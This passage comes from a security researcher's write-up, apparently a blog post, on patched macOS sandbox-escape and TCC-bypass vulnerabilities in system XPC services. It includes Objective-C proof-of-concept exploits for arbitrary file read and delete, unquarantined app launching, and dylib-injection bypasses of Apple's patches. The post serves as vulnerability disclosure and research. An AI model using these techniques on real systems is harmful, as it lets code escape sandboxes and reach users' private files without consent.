    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x poc.app/Contents/MacOS/poc; zip -r payload.zip poc.app");
}

void exploit_ArchiveService(void) {
    [[NSBundle bundleWithURL:[NSURL fileURLWithPath:@"/System/Library/PrivateFrameworks/DesktopServicesPriv.framework"]] load];
    DSArchiveService *service = [[objc_getClass("DSArchiveService") alloc]init];
    
    NSString *payloadPath = [NSHomeDirectory() stringByAppendingPathComponent:@"payload.zip"];
    NSString *dstPath = [NSHomeDirectory() stringByAppendingPathComponent:@"dst"];
    [service unarchiveItemAtURL:[NSURL fileURLWithPath:payloadPath] passphrase:nil destinationFolderURL:[NSURL fileURLWithPath:dstPath] completionHandler:^(NSURL *dstFolder, NSError *error) {
        NSLog(@"dstFolderURL:%@, error:%@", dstFolder, error);
        NSString *cmd = [NSString stringWithFormat:@"open %@/poc.app", [dstFolder path]];
        system([cmd UTF8String]);
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/RMyKyHYibSk</p>

<h3 id="the-patch-3">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.4 by checking the entitlement â€œ<strong>com.apple.private.ArchiveService.XPC</strong>â€ from the incoming XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150402830.png" alt="image-20241020150402830"></p>

<p>If the client doesnâ€™t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-32404">CVE-2023-32404</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172755928.png" alt="image-20241019172755928"></p>

<h3 id="the-issue-4">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox.</p>

<p>Moreover, it also has the special TCC entitlement in its code signature for <strong>Full Disk Access</strong>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150516910.png" alt="image-20241020150516910"></p>

<p>Therefore, it can also be exploited to bypass the TCC protection completely!</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150601039.png" alt="image-20241020150601039"></p>

<p>The <code>WFFileAccessHelperProtocol</code> has only one method <code>extendAccessToURL:completion:</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150641370.png" alt="image-20241020150641370"></p>

<p>The only XPC method is designed to grant the read and write permission of an arbitrary URL to the XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150711811.png" alt="image-20241020150711811"></p>

<p>Internally, it calls the API <code>sandbox_extension_issue_file</code> to issue the file access token.</p>

<p>The arbitrary URL is specified from the sandboxed XPC client.</p>

<h3 id="the-exploit-and-demo-4">The exploit and demo</h3>

<div><pre><code>@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&amp;W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/5FVDe8Le1pw</p>

<h3 id="the-patch-4">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.4 by checking the entitlement â€œ<strong>com.apple.shortcuts.file-access-helper</strong>â€ from the incoming XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151017457.png" alt="image-20241020151017457"></p>

<p>If the client doesnâ€™t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-41077">CVE-2023-41077</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172822557.png" alt="image-20241019172822557"></p>

<h3 id="the-issue-5">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/Frameworks/ImageCaptureCore.framework/XPCServices/mscamerad-xpc.xpc
</code></pre></div>

<p>Similarly, the XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox.</p>

<p>Whatâ€™s more, it has the special TCC entitlement in its code signature to access the <strong>Photos</strong> and <strong>Removable Volumes</strong> directly without prompting the users:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151150288.png" alt="image-20241020151150288"></p>

<p>Therefore, it can also be exploited to bypass these TCC protections at the same time!</p>

<p>The main logic is to listen at the service named â€œ<strong>com.apple.mscamerad-xpc</strong>â€.</p>

<p>Similarly, this XPC service accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151313353.png" alt="image-20241020151313353"></p>

<p>The <code>ICXPCDeviceManagerProtocol</code> has six methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151341184.png" alt="image-20241020151341184"></p>

<p>Specially, the XPC method â€œ<code>openDevice:withReply:</code>â€ is designed to open and construct a new <code>MSCameraDevice</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151437728.png" alt="image-20241020151437728"></p>

<p>During the initialization of the new device, it listens at another anonymous XPC service to provide some service routines for the new camera device:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151501301.png" alt="image-20241020151501301"></p>

<p>The anonymous XPC service accepts all the incoming XPC clients by returning YES in the camera deviceâ€™s delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151531992.png" alt="image-20241020151531992"></p>

<p>The <code>ICCameraDeviceProtocol</code> has 23 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151608007.png" alt="image-20241020151608007"></p>

<p>The issue exists in the XPC method â€œ<code>requestReadDataFromObjectHandle:options:withReply:</code>â€:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151651506.png" alt="image-20241020151651506"></p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151705732.png" alt="image-20241020151705732"></p>

<p>It reads the file content for the requested file item and replies the file content data to the XPC client. The requested file path is controlled from the XPC client. So a sandboxed application can exploit this XPC method to read an arbitrary file outside of the sandbox container.</p>

<p>At the same time, the sandboxed app can also read the userâ€™s <strong>Photos</strong> directly without prompting the users due to the serviceâ€™s powerful TCC entitlements.</p>

<h3 id="the-exploit-and-demo-5">The exploit and demo</h3>

<p>In order to trigger the vulnerability, we need to prepare the camera device and the camera file.</p>

<p>Through my research, I discovered that the <strong>MSCameraDevice</strong> can be emulated by creating a DMG file and mounting it.</p>

<p>Next, if a file path in the DMG volume matches the special <strong>regular expression</strong>, then the file item will be indexed as an <strong>ICCameraFile</strong> and the file data can be requested via the vulnerable XPC method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152029416.png" alt="image-20241020152029416"></p>

<div><pre><code>folderNameRegex = [NSRegularExpression regularExpressionWithPattern:@"^([1-9]{1}[\\d]{2}[\\w]{5})$|^((?i)\\bDCIM\\b)$" options:16 error:0];// e.g. 123abcde, DCIM, dcIm, ...
fileNameRegex = [NSRegularExpression regularExpressionWithPattern:@"^[\\w]{4}(E){0,1}(\\d){4}\\.(([\\w]){3}|HEIC)$" options:16 error:0];// e.g. abcd1234.mp3, 1234E5678.HEIC
</code></pre></div>

<p>So we can make a fake camera device and camera file like this:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152230512.png" alt="image-20241020152230512"></p>

<p>A sandboxed application could drop the DMG file and then open the DMG file to mount it to trigger the issue.</p>

<p>The XPC client has already been implemented in the ImageCaptureCore framework. The exploit code is as follows:</p>

<div><pre><code>@interface MyDeviceDelegate : NSObject&lt;ICCameraDeviceDelegate&gt;
@end
@implementation MyDeviceDelegate
- (void)cameraDevice:(ICCameraDevice *)camera didAddItems:(NSArray&lt;ICCameraItem *&gt; *)items { 
    NSLog(@"didAddItems");
    for (ICCameraFile *item in items) {
        NSLog(@"new file item:%@", item); // TODO: I should check the item type(file/folder) and item name here.
        [item requestReadDataAtOffset:0 length:item.fileSize completion:^(NSData *data, NSError *err) {
            NSLog(@"Got file data:%@ (%@)", data, [NSString stringWithCString:[data bytes] encoding:NSUTF8StringEncoding]);
        }];
    }
}
@end
@interface MyDeviceBrowserDelegate : NSObject&lt;ICDeviceBrowserDelegate&gt;
@end
@implementation MyDeviceBrowserDelegate
- (void)deviceBrowser:(ICDeviceBrowser *)browser didAddDevice:(ICDevice *)device moreComing:(BOOL)moreComing { 
    NSLog(@"didAddDevice:%@", device);
    device.delegate = devDelegate; // instance of MyDeviceDelegate
    [device requestOpenSession];
}
@end
void exploit(void) {
    ICDeviceBrowser *deviceBrowser = [[ICDeviceBrowser alloc]init];
    MyDeviceBrowserDelegate *browserDelegate = [[MyDeviceBrowserDelegate alloc]init];
    deviceBrowser.delegate = browserDelegate;
    [deviceBrowser start];
}
</code></pre></div>

<p>Demo link: https://youtu.be/bvJwne8b2g4</p>

<h3 id="the-patch-1">The patch 1</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14 by adding a new check in the function <code>acceptConnection:</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152404523.png" alt="image-20241020152404523"></p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152412462.png" alt="image-20241020152412462"></p>

<p>The check function returns <strong>OK</strong> if the incoming XPC client meets one of the following <strong>two conditions</strong>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152502353.png" alt="image-20241020152502353"></p>

<ul>
  <li>Return OK if the client has the private entitlement: â€œ<strong>com.apple.private.imagecapturecore.authorization_bypass</strong>â€.</li>
  <li>Return OK <strong>if the client is a platform binary!</strong></li>
</ul>

<h3 id="the-bypass-1">The bypass 1</h3>

<p>The second condition doesnâ€™t make any sense because the <strong>platform binary</strong> is not trustworthy and <strong>easy to inject</strong>! Then I reported the new issue to Apple. As a result, Apple assigned <strong>CVE-2024-23253</strong> to this bypass report:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152721547.png" alt="image-20241020152721547"></p>

<p>Hereâ€™s how I bypassed the patch to access the TCC-protected contents:</p>

<ol>
  <li>Make a dylib from the previous old exploit code</li>
  <li>Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., <code>/bin/ls</code>)</li>
  <li>Inject into the platform binary by using the environment variable <code>DYLD_INSERT_LIBRARIES</code></li>
  <li>Talk to the XPC service as before</li>
</ol>

<h3 id="the-patch-2">The patch 2</h3>

<p>Apple patched the issue again in macOS 14.4 by hardening the second condition:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153333113.png" alt="image-20241020153333113"></p>

<table>
  <tbody>
    <tr>
      <td>From the new patch code, we can see that it requires the XPC client to not only be the <strong>platform binary</strong>, but also to be signed with the flags: â€œ**CS_REQUIRE_LV</td>
      <td>CS_FORCED_LV**â€.</td>
    </tr>
  </tbody>
</table>

<h3 id="the-bypass-2">The bypass 2</h3>

<p>Apple thought that the new required flags would kill the dynamic library injection exploits. But they were wrong. The checks here can still be bypassed! Again, I reported the new bypass to Apple and they assigned the new CVE-2024-40831 for it:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153456843.png" alt="image-20241020153456843"></p>

<p>Hereâ€™s how I exploited it again:</p>

<ol>
  <li>Make a dylib from the previous old exploit code</li>
  <li>Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., <code>/bin/ls</code>)</li>
  <li>Inject into the platform binary by using the environment variable <code>DYLD_INSERT_LIBRARIES</code></li>
  <li><strong>Set the required flags manually</strong></li>
  <li>Talk to the XPC service as before</li>
</ol>

<p>Compared to the previous exploit, only one additional step has been added. After injecting into the platform binary â€œ<code>ls</code>â€ command, the exploit process doesnâ€™t have the required flags. However, the desired flags can be set manually at runtime via the system API â€œ<code>csops</code>â€:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153657853.png" alt="image-20241020153657853"></p>

<p>As a result, the exploit process will bypass all the checks and talk to the XPC service as before!</p>

<h3 id="the-patch-3">The patch 3</h3>

<p>Apple patched this issue again in macOS Sequoia 15:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153742037.png" alt="image-20241020153742037"></p>

<p>Now, It will approve the XPC connection, only if the XPC client has the private entitlement: â€œ<strong>com.apple.private.imagecapturecore.authorization_bypass</strong>â€.</p>

<h2 id="cve-2023-42961">CVE-2023-42961</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172851367.png" alt="image-20241019172851367"></p>

<p>Note that this vulnerability can also be exploited on <strong>iOS</strong>.</p>

<h3 id="the-issue-6">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/Frameworks/Intents.framework/XPCServices/intents_helper.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153831152.png" alt="image-20241020153831152"></p>

<p>The <code>INHServing</code> protocol has 11 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153859143.png" alt="image-20241020153859143"></p>

<p>There is a path traversal issue in the function named â€œ<code>filePathForImageWithFileName</code>â€:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154451538.png" alt="image-20241020154451538"></p>

<p>The function parameter <code>fileName</code> is an arbitrary string, that can be controlled by the XPC client.</p>

<p>This vulnerable function can be reached from two XPC methods:</p>

<p>The first XPC method is named â€œ<code>retrieveImageWithIdentifier:completion:</code>â€:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154537678.png" alt="image-20241020154537678"></p>

<p>It can be abused to read an arbitrary file with extension â€œ<code>.png</code>â€, and the retrieved data will be stored in a member variable of the â€œ<code>INImage</code>â€ instance and replied to the XPC client.</p>

<p>The second XPC method is named â€œ<code>purgeImageWithIdentifier:completion:</code>â€:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154636438.png" alt="image-20241020154636438"></p>

<p>It can be exploited to delete an arbitrary file path.</p>

<h3 id="the-exploit-and-demo-6">The exploit and demo</h3>

<div><pre><code>@protocol INHServing
- (oneway void)purgeImageWithIdentifier:(NSString *)arg1 completion:(void (^)(NSError *))arg2;
- (oneway void)retrieveImageWithIdentifier:(NSString *)arg1 completion:(void (^)(INImage *, NSError *))arg2;
@end

void exploit_intents_helper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/Frameworks/Intents.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.intents.intents-helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(INHServing)];
    [conn setInterruptionHandler:^{
        NSLog(@"connection interrupted!");
    }];
    [conn setInvalidationHandler:^{
        NSLog(@"connection invalidated!");
    }];
    [conn resume];

    [[conn remoteObjectProxy] purgeImageWithIdentifier:[@"../../../../.." stringByAppendingPathComponent:target] completion:^(NSError *error) {
        NSLog(@"error:%@", error);
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/X0fv3x6bmF8</p>

<h3 id="the-patch-5">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.0 by sanitizing the input string from the XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154748729.png" alt="image-20241020154748729"></p>

<p>The special characters used for path traversal will be trimmed.</p>

<h2 id="cve-2024-27864">CVE-2024-27864</h2>

<p>The CVE entry is waiting to be published.</p>

<h3 id="the-issue-7">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/DiskImages2.framework/XPCServices/diskimagescontroller.xpc
</code></pre></div>

<p>This XPC service is powerful because it has the special entitlement â€œ<strong>com.apple.diskimages.creator-uc</strong>â€ in its code signature:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155146714.png" alt="image-20241020155146714"></p>

<p>This entitlement has two main functions:</p>

<ul>
  <li>Talk to <code>/usr/libexec/diskimagesiod</code>, which has the <strong>FDA</strong> entitlement and does the real attach job.</li>
  <li>Connect to the IOKit Service â€œ<strong>AppleDiskImagesController</strong>â€ (<code>/System/Library/Extensions/AppleDiskImages2.kext</code>), which <strong>creates</strong> and <strong>quarantines</strong> a device for a DMG file.</li>
</ul>

<p>Similarly, the XPC service accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155625758.png" alt="image-20241020155625758"></p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155632557.png" alt="image-20241020155632557"></p>

<p>The <code>DIControllerProtocol</code> has 10 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155720932.png" alt="image-20241020155720932"></p>

<p>The first issue exists in the XPC method named â€œ<code>attachWithParams:reply:</code>â€:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155804040.png" alt="image-20241020155804040"></p>

<p>At line 12, it calls the function â€œ<code>checkAttachEntitlementWithError</code>â€. As the name implies, the checker function should check the entitlement of the incoming XPC client. However, it always returns <strong>TRUE</strong>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020155850857.png" alt="image-20241020155850857"></p>

<p>The XPC client has already been implemented in the <code>DiskImages2.framework</code> as the objective-c class <strong>DIAttachParams</strong>. And the XPC connection can be established via the method â€œ<code>-[DIAttachParams newAttachWithError:]</code>â€. So I could reuse the framework code directly like this to attach a DMG volume without reinventing the wheels:</p>

<div><pre><code>NSError *error=nil;
DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@"quarantined_payload.dmg"] error:&amp;error];
[params newAttachWithError:&amp;error];
</code></pre></div>

<p>However, I discovered that the <strong>client code</strong> in the framework will <strong>check</strong> whether the input URL is quarantined:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020160238432.png" alt="image-20241020160238432"></p>

<p>If the input URL is quarantined, it will set the <strong>quarantine parameter</strong> before invoking the XPC method to attach. This will notify the XPC service to quarantine the target device.</p>

<p>So in my own XPC client, I can <strong>skip the quarantine parameter setting</strong> and invoke the XPC method to attach directly. As a result, the XPC service will <strong>attach a quarantined DMG file without quarantining the corresponding device</strong>.</p>

<h3 id="the-exploit-and-demo-7">The exploit and demo</h3>

<p>In order to skip setting the quarantine parameter, I have to <strong>rewrite the XPC client code</strong> by myself:</p>

<div><pre><code>@protocol DIControllerProtocol
- (void)dupWithStderrHandle:(NSFileHandle *)arg1 reply:(void (^)(NSError *))arg2;
- (void)attachWithParams:(DIAttachParams *)arg1 reply:(void (^)(NSError *))reply;
@end
@interface DIController2Client : NSObject&lt;DIController2ClientProtocol&gt;
@end
@implementation DIController2Client
- (void)attachCompletedWithHandle:(NSFileHandle *)handle reply:(void (^)(NSError *))reply {
    NSLog(@"attachCompletedWithHandle:%@", handle);
    system("open /Volumes/.exploit/poc.app"); // launch the app from the payload.dmg (unquarantined mounting)
    reply(0);
}
@end
void exploit_diskimages2(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/DiskImages2.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.diskimagescontroller"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIControllerProtocol)];
    conn.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIController2ClientProtocol)];
    conn.exportedObject = [[DIController2Client alloc]init];
    [conn resume];
    id proxy = [conn remoteObjectProxy];
    
    // [proxy dupWithStderrHandle:[NSFileHandle fileHandleWithStandardError] reply:^(NSError *err) {}];
    DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@"payload.dmg"] error:nil];
    [proxy attachWithParams:params reply:^(NSError *err) { // the quarantined payload.dmg (dropped by this sandboxed app) will be attached without being quarantined!
        NSLog(@"attach error:%@", err);
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/FYcFwkgiGzw</p>

<h3 id="the-patch-6">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.4 by <strong>moving the verification logic from the client side to the server side</strong>.</p>

<p>It will quarantine the corresponding device directly from the server, if the input file path is quarantined.</p>

<h2 id="cve-2023-42977">CVE-2023-42977</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019173015038.png" alt="image-20241019173015038"></p>

<h3 id="the-issue-8">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/PowerlogCore.framework/XPCServices/PerfPowerServicesSignpostReader.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020162727212.png" alt="image-20241020162727212"></p>

<p>The <code>XPCSignpostReaderProtocol</code> has 6 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020162915916.png" alt="image-20241020162915916"></p>

<p>However, Apple has only implemented one XPC method named â€œ<code>submitSignpostDataWithConfig:withReply:</code>â€, the other 5 XPC methods are empty implementations.</p>

<p>The core logic of this XPC method is to collect the log data and archive it to a gzip file. It seems that the log archive data will later be submitted to the Apple servers. However, there is a path traversal issue in this XPC method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163019774.png" alt="image-20241020163019774"></p>

<p>Because the variable â€œ<code>tagUUID</code>â€ is an arbitrary string, that can be controlled by the XPC client. The â€œ<code>powerlog</code>â€ path can be hijacked to an arbitrary path.</p>

<h3 id="the-exploit-and-demo-8">The exploit and demo</h3>

<h4 id="the-exploit-1-arbitrary-path-delete">The Exploit 1: Arbitrary Path Delete</h4>

<p>At line 160 of the function:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163201932.png" alt="image-20241020163201932"></p>

<p>It calls the method named â€œ<code>archiveDirectoryAt:deleteOriginal:</code>â€ which will delete the â€œ<code>powerlog</code>â€ path. So this gives the attacker a primitive to remove an arbitrary path:</p>

<div><pre><code>    [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{
        @"taskingAllowlist":@{},
        @"taskingStartDate":[NSDate now],
        @"taskingEndDate":[NSDate now],
        @"taskingSubmitSP":@0,
        @"taskingTagConfig":@{
            @"TagUUID":[NSString stringWithFormat:@"/../../../../../%@", path]
        }
    } withReply:^(id reply) {
        NSLog(@"reply:%@", reply);
    }];
</code></pre></div>

<h4 id="the-exploit-2-arbitrary-directory-create-and-full-sandbox-esacpe">The Exploit 2: Arbitrary Directory Create and Full Sandbox Esacpe</h4>

<p>Moreover, at line 41 of the function â€œ<code>createSignpostFile:</code>â€:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020163334261.png" alt="image-20241020163334261"></p>

<p>It creates the directory at the â€œ<code>powerlog</code>â€ path. So this gives the attacker a primitive to create an arbitrary directory:</p>

<div><pre><code>@protocol XPCSignpostReaderProtocol &lt;NSObject&gt;
- (void) submitSignpostDataWithConfig:(id)config withReply:(void (^)(id))arg2;
@end
void my_create_path(NSString *path) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/PowerlogCore.framework"]load];
    conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.PerfPowerServicesSignpostReader"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCSignpostReaderProtocol)];
    [conn resume];
    [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{
        @â€œtaskingAllowlist":@{}, @"taskingStartDate":[NSDate now], @"taskingEndDate":[NSDate now], @â€œtaskingSubmitSP":@1,
        @"taskingTagConfig":@{
            @"TagUUID":[NSString stringWithFormat:@"/../../../../../%@/logarchive", path],
            â€¦
        }
    } withReply:^(id reply) {
        NSLog(@"reply:%@", reply);
    }];
}
</code></pre></div>

<p>In fact, <strong>the primitive to create an arbitrary directory without the quarantine extended attribute can lead to a full sandbox escape</strong>.</p>

<p>Here, I used the trick from <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a>:</p>

<div><pre><code>- (void)viewDidLoad {
    [super viewDidLoad];
    NSString *currentDir = NSHomeDirectory();
    NSString *payloadPath = [currentDir stringByAppendingPathComponent:@"payload"];
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:payloadPath atomically:TRUE encoding:NSUTF8StringEncoding error:nil];
    NSString *myapp = [currentDir stringByAppendingPathComponent:@"poc.app"];
    my_create_path(myapp); // create .app folder without being quarantined
    
    mkdir("poc.app/Contents", 0777);
    mkdir("poc.app/Contents/MacOS", 0777);
    symlink("/bin/bash", "poc.app/Contents/MacOS/poc");
    NSString *cmd = [NSString stringWithFormat:@"defaults write \"%@/poc.app/Contents/Info\" LSEnvironment -dict-add BASH_ENV \"%@\"", currentDir, payloadPath];
    system([cmd UTF8String]);
    system("open ./poc.app");
}
</code></pre></div>

<p>Demo link: https://youtu.be/6R4tfOGAjm0</p>

<h3 id="the-patch-7">The patch</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14.0 by <strong>sanitizing the UUID string</strong> from the XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020164330021.png" alt="image-20241020164330021"></p>

<p>If the input string is not a <strong>valid UUID</strong>, then it will exit the function.</p>

<h2 id="take-away">Take Away</h2>

<h3 id="summary">Summary</h3>

<ul>
  <li>
    <p>An overlooked attack surface</p>
  </li>
  <li>
    <ul>
      <li>System (private) frameworksâ€™ XPC services (<strong>PID Domain</strong>)</li>
    </ul>
  </li>
  <li>
    <p>Drop a file/folder without being quarantined == Full Sandbox Escape</p>
  </li>
  <li>
    <ul>
